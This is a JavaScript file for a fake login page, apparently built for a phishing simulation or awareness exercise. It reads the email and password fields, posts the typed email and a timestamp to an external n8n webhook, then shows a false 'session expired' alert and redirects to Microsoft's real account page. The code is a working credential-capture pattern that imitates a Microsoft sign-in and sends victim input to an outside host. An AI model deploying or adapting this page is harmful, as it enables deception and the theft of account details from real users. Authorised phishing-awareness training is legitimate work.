const TRACKING_URL = 'https://opiceblum.app.n8n.cloud/webhook/fc870a18-719e-4ad1-84f9-f503995fd4a4'; 
const TRAINING_URL = 'https://account.microsoft.com/account/Account?mkt=pt-BR';
const btnNext = document.querySelector(".btn-next");
const btnSigin = document.querySelector(".btn-sigin");
let emailDigitado = document.getElementById('emailInput').value;
let senhaDigitada = document.getElementById('passwordInput').value;
let dadosRastreio; 
// 1. Obtém a parte da URL que contém os parâmetros (a partir do '?')
const queryString = window.location.search;

// 2. Cria um objeto que facilita a leitura desses parâmetros
const urlParams = new URLSearchParams(queryString);

// 3. Usa o método .get() para obter o valor de uma chave específica
const nomeUsuario = urlParams.get('usuario'); // Retorna 'joao'
const valorChave = urlParams.get('chave');   // Retorna 'valorSecreto123'

// Exemplo de uso (exibir na página)
if (nomeUsuario) {
  console.log(`Parâmetro 'usuario' encontrado: ${nomeUsuario}`);
  // Você pode injetar isso em algum lugar no HTML:
  // document.getElementById('bem-vindo').innerText = 'Olá, ' + nomeUsuario;
}
btnNext.addEventListener('click', () => {
    console.log("teste");
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        
        loginForm.addEventListener('submit', function(event) {

            event.preventDefault(); 
            
            emailDigitado = document.getElementById('emailInput').value;

              dadosRastreio = {

                alvo_email: emailDigitado,
                
                evento: 'Tentativa_de_Login_Simulado',
                timestamp: new Date().toISOString()
            };

            fetch(TRACKING_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dadosRastreio)
            })
            .then(response => {
                console.log('Rastreamento de submissão enviado com sucesso.');
            })
            .catch(error => {
                console.error('Erro ao enviar dados de rastreamento:', error);
            })
            .finally(() => {
                alert("Sessão expirada. Redirecionando para a página inicial...");
                window.location.href = TRAINING_URL;
            });
        });
    }
});

btnSigin.addEventListener("click", () => {

    console.log("teste");
    
              fetch(TRACKING_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dadosRastreio)
            })
            .then(response => {
                console.log('Rastreamento de submissão enviado com sucesso.');
            })
            .catch(error => {
                console.error('Erro ao enviar dados de rastreamento:', error);
            })
            .finally(() => {
                alert("Sessão expirada. Redirecionando para a página inicial...");
                window.location.href = TRAINING_URL;
            });
})